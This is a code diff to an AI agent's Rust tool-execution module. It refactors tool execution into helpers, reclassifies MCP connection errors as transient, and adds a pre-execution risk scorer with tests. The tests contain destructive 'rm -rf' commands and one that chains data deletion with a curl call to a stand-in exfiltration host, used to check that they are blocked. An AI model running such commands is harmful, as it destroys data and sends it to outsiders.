@@ -12,7 +12,7 @@ use halcon_core::types::{
     ContentBlock, DomainEvent, EventPayload, PermissionDecision, PermissionLevel, ToolInput,
 };
 use halcon_core::EventSender;
-use halcon_storage::{AsyncDatabase, TraceStep, TraceStepType};
+use halcon_storage::{AsyncDatabase, ToolExecutionMetric, TraceStep, TraceStepType};
 use halcon_tools::ToolRegistry;
 
 use halcon_core::types::ToolRetryConfig;
@@ -21,6 +21,7 @@ use super::accumulator::CompletedToolUse;
 use super::conversational_permission::ConversationalPermissionHandler;
 use super::adaptive_prompt::RiskLevel as AdaptiveRiskLevel;
 use super::idempotency::DryRunMode;
+use super::output_risk_scorer;
 use crate::render::sink::RenderSink;
 use crate::render::diff::{compute_ai_diff, render_file_diff};
 
@@ -116,6 +117,14 @@ fn synthetic_dry_run_result(tool_call: &CompletedToolUse) -> ToolExecResult {
 }
 
 /// Check if an error message indicates a transient failure that can be retried.
+///
+/// Transient errors are temporary conditions — a brief wait or a single retry may
+/// succeed. The agent loop uses this to decide whether to suppress the
+/// `EnvironmentError` halt path and allow one more round.
+///
+/// IMPORTANT: MCP *connection* failures (pool call failed, connection reset) are
+/// classified as transient — the MCP server can recover within the same session.
+/// MCP *initialization* failures (server not started, process fail) are deterministic.
 fn is_transient_error(error: &str) -> bool {
     let lower = error.to_lowercase();
     lower.contains("timeout")
@@ -127,13 +136,22 @@ fn is_transient_error(error: &str) -> bool {
         || lower.contains("connection refused")
         || lower.contains("broken pipe")
         || lower.contains("temporary")
+        // MCP pool/transport errors: the MCP server process is alive but the
+        // stdio/socket connection dropped transiently. Can recover in next round.
+        || lower.contains("mcp pool call failed")
+        || lower.contains("failed to call")
+        || lower.contains("transport error")
+        || lower.contains("channel closed")
 }
 
 /// Check if an error is deterministic (will never succeed on retry/replan).
 ///
 /// These errors indicate permanent conditions: missing files, bad permissions,
-/// invalid schemas, billing/auth failures, dead MCP servers, etc.
+/// invalid schemas, billing/auth failures, tool not registered, etc.
 /// Retrying or replanning will produce the same result — abort rather than loop.
+///
+/// NOTE: MCP *connection* failures are NOT in this list (moved to is_transient_error).
+/// Only MCP *initialization* failures (server not started, process crash) are here.
 pub fn is_deterministic_error(error: &str) -> bool {
     let lower = error.to_lowercase();
     lower.contains("no such file or directory")
@@ -154,14 +172,12 @@ pub fn is_deterministic_error(error: &str) -> bool {
         || lower.contains("authentication")
         || lower.contains("unauthorized")
         || lower.contains("insufficient_quota")
-        // MCP environment errors — the server is dead/unreachable; replanning into
-        // the same dead tools is futile and causes the 20-40 round burn described
-        // in the behavioral audit. Classify all MCP failure modes as deterministic.
-        || lower.contains("mcp pool call failed")
-        || lower.contains("failed to call")
+        // MCP initialization errors — the server process failed to start or
+        // the tool/engine was never initialized. Re-calling will never work.
         || lower.contains("mcp server is not initialized")
         || lower.contains("not initialized")
         || lower.contains("process start")
+        || lower.contains("process failed")
 }
 
 /// Generate diff preview for file_edit operations.
@@ -237,7 +253,227 @@ fn jittered_delay(delay_ms: u64) -> u64 {
     (delay_ms as f64 * jitter_factor) as u64
 }
 
-/// Execute a single tool (used for both parallel and sequential paths).
+// ─────────────────────────────────────────────────────────────────────────────
+// execute_one_tool helpers — each <50 LOC, independently testable
+// ─────────────────────────────────────────────────────────────────────────────
+
+/// Build a ToolExecResult with is_error=true and zero duration.
+#[inline]
+fn make_error_result(tool_call: &CompletedToolUse, content: String) -> ToolExecResult {
+    ToolExecResult {
+        tool_use_id: tool_call.id.clone(),
+        tool_name: tool_call.name.clone(),
+        content_block: ContentBlock::ToolResult {
+            tool_use_id: tool_call.id.clone(),
+            content,
+            is_error: true,
+        },
+        duration_ms: 0,
+        was_parallel: false,
+    }
+}
+
+/// Return an error result if the tool is not in the registry.
+fn check_tool_known(
+    tool_call: &CompletedToolUse,
+    registry: &ToolRegistry,
+) -> Result<std::sync::Arc<dyn halcon_core::traits::Tool>, ToolExecResult> {
+    registry.get(&tool_call.name).cloned().ok_or_else(|| {
+        make_error_result(tool_call, format!("Error: unknown tool '{}'", tool_call.name))
+    })
+}
+
+/// Return a dry-run result if the mode demands it, otherwise None.
+fn check_dry_run(
+    tool_call: &CompletedToolUse,
+    perm_level: PermissionLevel,
+    dry_run_mode: DryRunMode,
+) -> Option<ToolExecResult> {
+    match dry_run_mode {
+        DryRunMode::Off => None,
+        DryRunMode::Full => Some(synthetic_dry_run_result(tool_call)),
+        DryRunMode::DestructiveOnly if perm_level >= PermissionLevel::ReadWrite => {
+            Some(synthetic_dry_run_result(tool_call))
+        }
+        DryRunMode::DestructiveOnly => None,
+    }
+}
+
+/// Return a cached result if this call was already executed, plus the execution_id for recording.
+fn check_idempotency(
+    tool_call: &CompletedToolUse,
+    idempotency: Option<&super::idempotency::IdempotencyRegistry>,
+) -> (Option<ToolExecResult>, Option<String>) {
+    let Some(reg) = idempotency else { return (None, None) };
+    let id = super::idempotency::compute_execution_id(&tool_call.name, &tool_call.input, "");
+    if let Some(cached) = reg.lookup(&id) {
+        let result = ToolExecResult {
+            tool_use_id: tool_call.id.clone(),
+            tool_name: tool_call.name.clone(),
+            content_block: ContentBlock::ToolResult {
+                tool_use_id: tool_call.id.clone(),
+                content: cached.result_content,
+                is_error: cached.is_error,
+            },
+            duration_ms: 0,
+            was_parallel: false,
+        };
+        return (Some(result), Some(id));
+    }
+    (None, Some(id))
+}
+
+/// Validate tool arguments: reject poisoned parse errors and high-risk args.
+/// Returns Some(error_result) if the call must be blocked, None if safe to proceed.
+fn validate_tool_args(tool_call: &CompletedToolUse) -> Option<ToolExecResult> {
+    // RC-4: Reject malformed args from streaming parse failures.
+    if let Some(parse_err) = tool_call.input.get("_parse_error") {
+        let err_msg = parse_err.as_str().unwrap_or("unknown parse error");
+        tracing::error!(
+            tool = %tool_call.name,
+            tool_use_id = %tool_call.id,
+            parse_error = %err_msg,
+            "Rejecting tool call with malformed arguments from streaming parse failure"
+        );
+        return Some(make_error_result(
+            tool_call,
+            format!(
+                "Error: tool arguments were corrupted during streaming (parse error: {err_msg}). \
+                 The model's tool call was truncated or malformed. Please retry."
+            ),
+        ));
+    }
+    // G3: Pre-execution risk scoring — block high-risk args before execution.
+    let risk = output_risk_scorer::score_tool_args(&tool_call.name, &tool_call.input);
+    if risk.is_high_risk() {
+        tracing::warn!(
+            tool = %tool_call.name,
+            score = risk.score,
+            flags = ?risk.flags,
+            "Tool args blocked by pre-execution risk scorer (score >= 50)"
+        );
+        return Some(make_error_result(
+            tool_call,
+            format!(
+                "[BLOCKED] High-risk tool arguments detected (score: {}/100). \
+                 Flags: {:?}. The command was rejected by pre-execution risk scoring.",
+                risk.score, risk.flags
+            ),
+        ));
+    }
+    None
+}
+
+/// Execute the tool with exponential-backoff retries for transient failures.
+async fn run_with_retry(
+    tool_call: &CompletedToolUse,
+    tool: &std::sync::Arc<dyn halcon_core::traits::Tool>,
+    working_dir: &str,
+    tool_timeout: Duration,
+    retry_config: &ToolRetryConfig,
+    render_sink: &dyn RenderSink,
+) -> ToolExecResult {
+    let start = Instant::now();
+    let max_attempts = retry_config.max_retries + 1;
+
+    for attempt in 0..max_attempts {
+        let tool_input = ToolInput {
+            tool_use_id: tool_call.id.clone(),
+            arguments: tool_call.input.clone(),
+            working_directory: working_dir.to_string(),
+        };
+
+        match tokio::time::timeout(tool_timeout, tool.execute(tool_input)).await {
+            Ok(Ok(output)) => {
+                return ToolExecResult {
+                    tool_use_id: tool_call.id.clone(),
+                    tool_name: tool_call.name.clone(),
+                    content_block: ContentBlock::ToolResult {
+                        tool_use_id: tool_call.id.clone(),
+                        content: output.content,
+                        is_error: output.is_error,
+                    },
+                    duration_ms: start.elapsed().as_millis() as u64,
+                    was_parallel: false,
+                };
+            }
+            Ok(Err(e)) => {
+                let err_str = format!("{e}");
+                if attempt + 1 < max_attempts && is_transient_error(&err_str) {
+                    let delay = jittered_delay(std::cmp::min(
+                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
+                        retry_config.max_delay_ms,
+                    ));
+                    tracing::info!(tool = %tool_call.name, attempt = attempt + 1, delay_ms = delay, "Retrying transient tool error: {err_str}");
+                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
+                    tokio::time::sleep(Duration::from_millis(delay)).await;
+                    continue;
+                }
+                return ToolExecResult {
+                    tool_use_id: tool_call.id.clone(),
+                    tool_name: tool_call.name.clone(),
+                    content_block: ContentBlock::ToolResult {
+                        tool_use_id: tool_call.id.clone(),
+                        content: format!("Error: {e}"),
+                        is_error: true,
+                    },
+                    duration_ms: start.elapsed().as_millis() as u64,
+                    was_parallel: false,
+                };
+            }
+            Err(_elapsed) => {
+                let err_str = format!("Error: tool '{}' timed out after {}s", tool_call.name, tool_timeout.as_secs());
+                if attempt + 1 < max_attempts {
+                    let delay = std::cmp::min(
+                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
+                        retry_config.max_delay_ms,
+                    );
+                    tracing::info!(tool = %tool_call.name, attempt = attempt + 1, delay_ms = delay, "Retrying timed out tool");
+                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
+                    tokio::time::sleep(Duration::from_millis(delay)).await;
+                    continue;
+                }
+                return ToolExecResult {
+                    tool_use_id: tool_call.id.clone(),
+                    tool_name: tool_call.name.clone(),
+                    content_block: ContentBlock::ToolResult {
+                        tool_use_id: tool_call.id.clone(),
+                        content: err_str,
+                        is_error: true,
+                    },
+                    duration_ms: start.elapsed().as_millis() as u64,
+                    was_parallel: false,
+                };
+            }
+        }
+    }
+    unreachable!("loop always returns on final attempt")
+}
+
+/// Record the execution result in the idempotency registry.
+fn record_idempotency(
+    idempotency: Option<&super::idempotency::IdempotencyRegistry>,
+    exec_id: Option<String>,
+    tool_call: &CompletedToolUse,
+    result: &ToolExecResult,
+) {
+    let (Some(registry), Some(id)) = (idempotency, exec_id) else { return };
+    let (content, is_error) = match &result.content_block {
+        ContentBlock::ToolResult { content, is_error, .. } => (content.clone(), *is_error),
+        _ => (String::new(), false),
+    };
+    registry.record(super::idempotency::ExecutionRecord {
+        execution_id: id,
+        tool_name: tool_call.name.clone(),
+        result_content: content,
+        is_error,
+        executed_at: chrono::Utc::now(),
+    });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
+/// Execute a single tool — orchestrates pre/post gates and delegates to helpers.
 async fn execute_one_tool(
     tool_call: &CompletedToolUse,
     registry: &ToolRegistry,
@@ -249,220 +485,59 @@ async fn execute_one_tool(
     render_sink: &dyn RenderSink,
     plugin_registry: Option<&std::sync::Mutex<super::plugin_registry::PluginRegistry>>,
 ) -> ToolExecResult {
-    let Some(tool) = registry.get(&tool_call.name) else {
-        return ToolExecResult {
-            tool_use_id: tool_call.id.clone(),
-            tool_name: tool_call.name.clone(),
-            content_block: ContentBlock::ToolResult {
-                tool_use_id: tool_call.id.clone(),
-                content: format!("Error: unknown tool '{}'", tool_call.name),
-                is_error: true,
-            },
-            duration_ms: 0,
-            was_parallel: false,
-        };
+    // 1. Resolve tool from registry (fail fast on unknown tool).
+    let tool = match check_tool_known(tool_call, registry) {
+        Ok(t) => t,
+        Err(e) => return e,
     };
 
-    // Step 8: Plugin pre-invoke gate — check circuit breaker, cost budget, and permissions.
-    // When plugin_registry is None (all existing sessions) this entire block is skipped.
+    // 2. Plugin pre-invoke gate (fail-closed on lock contention).
     if let Some(pr_mutex) = plugin_registry {
-        if let Ok(pr) = pr_mutex.try_lock() {
-            if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
-                match pr.pre_invoke_gate(&plugin_id, &tool_call.name, false) {
-                    super::plugin_registry::InvokeGateResult::Deny(reason) => {
+        match pr_mutex.try_lock() {
+            Ok(pr) => {
+                if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
+                    if let super::plugin_registry::InvokeGateResult::Deny(reason) =
+                        pr.pre_invoke_gate(&plugin_id, &tool_call.name, false)
+                    {
                         return synthetic_plugin_denied_result(tool_call, &reason);
                     }
-                    super::plugin_registry::InvokeGateResult::Proceed => {}
                 }
             }
-        }
-    }
-
-    // Dry-run mode: skip execution based on mode + permission level.
-    match dry_run_mode {
-        DryRunMode::Off => { /* Normal execution, fall through. */ }
-        DryRunMode::Full => {
-            return synthetic_dry_run_result(tool_call);
-        }
-        DryRunMode::DestructiveOnly => {
-            let perm_level = tool.permission_level();
-            if perm_level >= PermissionLevel::ReadWrite {
-                return synthetic_dry_run_result(tool_call);
+            Err(_) => {
+                tracing::warn!(tool = %tool_call.name, "plugin gate lock contention — denying tool (fail-closed)");
+                return synthetic_plugin_denied_result(tool_call, "plugin service temporarily unavailable");
             }
         }
     }
 
-    // Idempotency check: return cached result if this exact call was already executed.
-    let exec_id = if let Some(reg) = idempotency {
-        let id = super::idempotency::compute_execution_id(&tool_call.name, &tool_call.input, "");
-        if let Some(cached) = reg.lookup(&id) {
-            return ToolExecResult {
-                tool_use_id: tool_call.id.clone(),
-                tool_name: tool_call.name.clone(),
-                content_block: ContentBlock::ToolResult {
-                    tool_use_id: tool_call.id.clone(),
-                    content: cached.result_content,
-                    is_error: cached.is_error,
-                },
-                duration_ms: 0,
-                was_parallel: false,
-            };
-        }
-        Some(id)
-    } else {
-        None
-    };
-
-    // Reject poisoned tool arguments from accumulator parse failures (RC-4).
-    if let Some(parse_err) = tool_call.input.get("_parse_error") {
-        let err_msg = parse_err.as_str().unwrap_or("unknown parse error");
-        tracing::error!(
-            tool = %tool_call.name,
-            tool_use_id = %tool_call.id,
-            parse_error = %err_msg,
-            "Rejecting tool call with malformed arguments from streaming parse failure"
-        );
-        return ToolExecResult {
-            tool_use_id: tool_call.id.clone(),
-            tool_name: tool_call.name.clone(),
-            content_block: ContentBlock::ToolResult {
-                tool_use_id: tool_call.id.clone(),
-                content: format!(
-                    "Error: tool arguments were corrupted during streaming (parse error: {err_msg}). \
-                     The model's tool call was truncated or malformed. Please retry."
-                ),
-                is_error: true,
-            },
-            duration_ms: 0,
-            was_parallel: false,
-        };
+    // 3. Dry-run shortcut.
+    if let Some(r) = check_dry_run(tool_call, tool.permission_level(), dry_run_mode) {
+        return r;
     }
 
-    let start = Instant::now();
-    let max_attempts = retry_config.max_retries + 1; // 1 initial + N retries
+    // 4. Idempotency cache lookup.
+    let (cached, exec_id) = check_idempotency(tool_call, idempotency);
+    if let Some(r) = cached { return r; }
 
-    let mut exec_result = None;
-    for attempt in 0..max_attempts {
-        let tool_input = ToolInput {
-            tool_use_id: tool_call.id.clone(),
-            arguments: tool_call.input.clone(),
-            working_directory: working_dir.to_string(),
-        };
+    // 5. Argument validation (parse errors + risk scoring).
+    if let Some(r) = validate_tool_args(tool_call) { return r; }
 
-        let result = tokio::time::timeout(tool_timeout, tool.execute(tool_input)).await;
+    // 6. Execute with exponential-backoff retry.
+    let exec_result = run_with_retry(tool_call, &tool, working_dir, tool_timeout, retry_config, render_sink).await;
 
-        match result {
-            Ok(Ok(output)) => {
-                exec_result = Some(ToolExecResult {
-                    tool_use_id: tool_call.id.clone(),
-                    tool_name: tool_call.name.clone(),
-                    content_block: ContentBlock::ToolResult {
-                        tool_use_id: tool_call.id.clone(),
-                        content: output.content,
-                        is_error: output.is_error,
-                    },
-                    duration_ms: start.elapsed().as_millis() as u64,
-                    was_parallel: false,
-                });
-                break;
-            }
-            Ok(Err(e)) => {
-                let err_str = format!("{e}");
-                if attempt + 1 < max_attempts && is_transient_error(&err_str) {
-                    let base = std::cmp::min(
-                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
-                        retry_config.max_delay_ms,
-                    );
-                    let delay = jittered_delay(base);
-                    tracing::info!(
-                        tool = %tool_call.name,
-                        attempt = attempt + 1,
-                        delay_ms = delay,
-                        "Retrying transient tool error: {err_str}"
-                    );
-                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
-                    tokio::time::sleep(Duration::from_millis(delay)).await;
-                    continue;
-                }
-                exec_result = Some(ToolExecResult {
-                    tool_use_id: tool_call.id.clone(),
-                    tool_name: tool_call.name.clone(),
-                    content_block: ContentBlock::ToolResult {
-                        tool_use_id: tool_call.id.clone(),
-                        content: format!("Error: {e}"),
-                        is_error: true,
-                    },
-                    duration_ms: start.elapsed().as_millis() as u64,
-                    was_parallel: false,
-                });
-                break;
-            }
-            Err(_elapsed) => {
-                let err_str = format!(
-                    "Error: tool '{}' timed out after {}s",
-                    tool_call.name,
-                    tool_timeout.as_secs()
-                );
-                if attempt + 1 < max_attempts && is_transient_error(&err_str) {
-                    let delay = std::cmp::min(
-                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
-                        retry_config.max_delay_ms,
-                    );
-                    tracing::info!(
-                        tool = %tool_call.name,
-                        attempt = attempt + 1,
-                        delay_ms = delay,
-                        "Retrying timed out tool"
-                    );
-                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
-                    tokio::time::sleep(Duration::from_millis(delay)).await;
-                    continue;
-                }
-                exec_result = Some(ToolExecResult {
-                    tool_use_id: tool_call.id.clone(),
-                    tool_name: tool_call.name.clone(),
-                    content_block: ContentBlock::ToolResult {
-                        tool_use_id: tool_call.id.clone(),
-                        content: err_str,
-                        is_error: true,
-                    },
-                    duration_ms: start.elapsed().as_millis() as u64,
-                    was_parallel: false,
-                });
-                break;
-            }
-        }
-    }
+    // 7. Record in idempotency registry.
+    record_idempotency(idempotency, exec_id, tool_call, &exec_result);
 
-    // Unwrap is safe: the loop always sets exec_result before break.
-    let exec_result = exec_result.unwrap();
-
-    // Record result in idempotency registry for future deduplication.
-    if let (Some(registry), Some(id)) = (idempotency, exec_id) {
-        let (content, is_error) = match &exec_result.content_block {
-            ContentBlock::ToolResult { content, is_error, .. } => (content.clone(), *is_error),
-            _ => (String::new(), false),
-        };
-        registry.record(super::idempotency::ExecutionRecord {
-            execution_id: id,
-            tool_name: tool_call.name.clone(),
-            result_content: content,
-            is_error,
-            executed_at: chrono::Utc::now(),
-        });
-    }
-
-    // Step 8: Plugin post-invoke — record outcome in circuit breaker and cost tracker.
-    // When plugin_registry is None (all existing sessions) this block is skipped.
+    // 8. Plugin post-invoke (best-effort, lock contention just skips metrics).
     if let Some(pr_mutex) = plugin_registry {
-        if let Ok(mut pr) = pr_mutex.try_lock() {
-            if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
-                let is_err = matches!(
-                    &exec_result.content_block,
-                    ContentBlock::ToolResult { is_error: true, .. }
-                );
-                pr.post_invoke(&plugin_id, &tool_call.name, 0, 0.0, !is_err, None);
+        match pr_mutex.try_lock() {
+            Ok(mut pr) => {
+                if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
+                    let is_err = matches!(&exec_result.content_block, ContentBlock::ToolResult { is_error: true, .. });
+                    pr.post_invoke(&plugin_id, &tool_call.name, 0, 0.0, !is_err, None);
+                }
             }
+            Err(_) => tracing::warn!(tool = %tool_call.name, "plugin post-invoke metrics skipped — lock contention"),
         }
     }
 
@@ -598,6 +673,35 @@ pub async fn execute_parallel_batch(
                 tracing::warn!("trace recording failed (step {}): {e}", *trace_step_index);
             }
             *trace_step_index += 1;
+        }
+    }
+
+    // Persist tool execution metrics to M11 (tool_execution_metrics table).
+    // Uses batch insert for efficiency — single transaction for the whole parallel batch.
+    // Non-fatal: metric recording failures never propagate to the caller.
+    if let Some(db) = trace_db {
+        let metrics: Vec<ToolExecutionMetric> = results
+            .iter()
+            .map(|r| {
+                let is_error = matches!(
+                    &r.content_block,
+                    ContentBlock::ToolResult { is_error, .. } if *is_error
+                );
+                ToolExecutionMetric {
+                    tool_name: r.tool_name.clone(),
+                    session_id: Some(session_id.to_string()),
+                    duration_ms: r.duration_ms,
+                    success: !is_error,
+                    is_parallel: true,
+                    input_summary: None,
+                    created_at: Utc::now(),
+                }
+            })
+            .collect();
+        if !metrics.is_empty() {
+            if let Err(e) = db.inner().batch_insert_tool_metrics(&metrics) {
+                tracing::warn!("tool_execution_metrics batch insert failed: {e}");
+            }
         }
     }
 
@@ -779,7 +883,15 @@ pub async fn execute_sequential_tool(
             tool_name: tool_call.name.clone(),
             content_block: ContentBlock::ToolResult {
                 tool_use_id: tool_call.id.clone(),
-                content: "Error: user denied permission".into(),
+                // Explicit "do not retry" signal: the model must NOT call this tool again.
+                // A generic "permission denied" message is ambiguous — the model may interpret
+                // it as a transient error and retry. The explicit instruction prevents retry loops.
+                content: format!(
+                    "Error: the user explicitly denied permission for '{}'. \
+                     Do NOT retry this tool. Acknowledge the denial to the user \
+                     and adjust your plan accordingly.",
+                    tool_call.name
+                ),
                 is_error: true,
             },
             duration_ms: 0,
@@ -875,6 +987,23 @@ pub async fn execute_sequential_tool(
     let result = execute_one_tool(tool_call, registry, working_dir, tool_timeout, exec_config.dry_run_mode, exec_config.idempotency, &exec_config.retry, render_sink, plugin_registry).await;
     let is_error = matches!(&result.content_block,
         ContentBlock::ToolResult { is_error, .. } if *is_error);
+
+    // Persist tool execution metric to M11 (tool_execution_metrics table).
+    // Non-fatal: failure here never propagates to the caller.
+    if let Some(db) = trace_db {
+        let tool_metric = ToolExecutionMetric {
+            tool_name: result.tool_name.clone(),
+            session_id: Some(session_id.to_string()),
+            duration_ms: result.duration_ms,
+            success: !is_error,
+            is_parallel: false,
+            input_summary: None,
+            created_at: Utc::now(),
+        };
+        if let Err(e) = db.inner().insert_tool_metric(&tool_metric) {
+            tracing::warn!("tool_execution_metrics insert failed: {e}");
+        }
+    }
 
     let _ = event_tx.send(DomainEvent::new(EventPayload::ToolExecuted {
         tool: tool_call.name.clone(),
@@ -2304,14 +2433,35 @@ mod tests {
 
         #[test]
         fn deterministic_mcp_environment_errors() {
-            // P0-A: MCP failures are deterministic — the server is dead, replanning is futile.
-            assert!(is_deterministic_error("MCP pool call failed: connection refused to server"));
-            assert!(is_deterministic_error("failed to call 'filesystem/read_file' after 5 attempts"));
-            assert!(is_deterministic_error("MCP server is not initialized"));
-            assert!(is_deterministic_error("not initialized: call ensure_initialized first"));
-            assert!(is_deterministic_error("process start failed: no such executable"));
-            // Verify transient "connection reset" is still NOT deterministic.
-            assert!(!is_deterministic_error("connection reset by peer"));
+            // SOTA 2026: Split MCP failures into transient vs deterministic.
+            //
+            // TRANSIENT (pool/connection can recover within the session):
+            // MCP pool call failures and transport errors are transient — the MCP server
+            // process may still be alive; the stdio/socket dropped and can reconnect.
+            assert!(!is_deterministic_error("MCP pool call failed: connection refused to server"),
+                "mcp pool call failed is transient (server may recover)");
+            assert!(!is_deterministic_error("failed to call 'filesystem/read_file' after 5 attempts"),
+                "failed to call is transient — retrying via is_transient_error path");
+            assert!(!is_deterministic_error("connection reset by peer"),
+                "connection reset is transient");
+            assert!(!is_deterministic_error("transport error: channel closed"),
+                "transport/channel errors are transient");
+
+            // DETERMINISTIC (server/tool was never initialized; will never work):
+            assert!(is_deterministic_error("MCP server is not initialized"),
+                "server not initialized is deterministic");
+            assert!(is_deterministic_error("not initialized: call ensure_initialized first"),
+                "not initialized is deterministic");
+            assert!(is_deterministic_error("process start failed: no such executable"),
+                "process start failed is deterministic");
+        }
+
+        #[test]
+        fn transient_mcp_connection_errors() {
+            // MCP transport/connection errors can recover — classify as transient, NOT deterministic.
+            assert!(!is_deterministic_error("MCP pool call failed: connection refused to server"));
+            assert!(!is_deterministic_error("failed to call tool after 3 retries"));
+            assert!(!is_deterministic_error("channel closed unexpectedly"));
         }
 
         // === Phase 27 Stress Tests ===
@@ -2379,6 +2529,88 @@ mod tests {
                     );
                 }
             }
+        }
+    }
+
+    // ── Output Risk Scorer Wiring Tests (Critical Security Fix) ────────────────
+    //
+    // These tests verify that score_tool_args() is actively called in execute_one_tool()
+    // and that high-risk bash commands are blocked BEFORE execution.
+
+    #[tokio::test]
+    async fn rm_rf_bash_command_blocked_by_risk_scorer() {
+        // rm -rf is a destructive command that scores +50 → is_high_risk() → blocked.
+        let registry = halcon_tools::default_registry(&Default::default());
+        let tool = CompletedToolUse {
+            id: "t1".to_string(),
+            name: "bash".to_string(),
+            input: serde_json::json!({"command": "rm -rf /tmp/test_dir"}),
+        };
+
+        let result = execute_one_tool(
+            &tool, &registry, "/tmp",
+            Duration::from_secs(10), DryRunMode::Off, None,
+            &ToolRetryConfig::default(), &*TEST_SINK, None,
+        ).await;
+
+        match &result.content_block {
+            ContentBlock::ToolResult { content, is_error, .. } => {
+                assert!(*is_error, "rm -rf should be blocked as high-risk");
+                assert!(content.contains("[BLOCKED]"), "content should contain [BLOCKED]: {content}");
+                assert!(content.contains("risk"), "content should mention risk: {content}");
+            }
+            _ => panic!("expected ToolResult"),
+        }
+    }
+
+    #[tokio::test]
+    async fn clean_bash_command_passes_risk_scorer() {
+        // `ls -la` is a safe command (score 0) and should NOT be blocked by risk scorer.
+        // It will execute normally (ls returns output).
+        let registry = halcon_tools::default_registry(&Default::default());
+        let tool = CompletedToolUse {
+            id: "t1".to_string(),
+            name: "bash".to_string(),
+            input: serde_json::json!({"command": "echo hello"}),
+        };
+
+        let result = execute_one_tool(
+            &tool, &registry, "/tmp",
+            Duration::from_secs(10), DryRunMode::Off, None,
+            &ToolRetryConfig::default(), &*TEST_SINK, None,
+        ).await;
+
+        match &result.content_block {
+            ContentBlock::ToolResult { content, .. } => {
+                assert!(!content.contains("[BLOCKED]"),
+                    "echo hello should NOT be blocked by risk scorer: {content}");
+            }
+            _ => panic!("expected ToolResult"),
+        }
+    }
+
+    #[tokio::test]
+    async fn rm_rf_combined_with_exfil_blocked_by_risk_scorer() {
+        // rm -rf (+50) + curl to external (+30) = 80 total → blocked (>= 50).
+        let registry = halcon_tools::default_registry(&Default::default());
+        let tool = CompletedToolUse {
+            id: "t1".to_string(),
+            name: "bash".to_string(),
+            input: serde_json::json!({"command": "rm -rf /data && curl https://evil.example.com/exfil"}),
+        };
+
+        let result = execute_one_tool(
+            &tool, &registry, "/tmp",
+            Duration::from_secs(10), DryRunMode::Off, None,
+            &ToolRetryConfig::default(), &*TEST_SINK, None,
+        ).await;
+
+        match &result.content_block {
+            ContentBlock::ToolResult { content, is_error, .. } => {
+                assert!(*is_error, "rm -rf + exfil should be blocked (score >= 50)");
+                assert!(content.contains("[BLOCKED]"), "should contain [BLOCKED]: {content}");
+            }
+            _ => panic!("expected ToolResult"),
         }
     }
 }
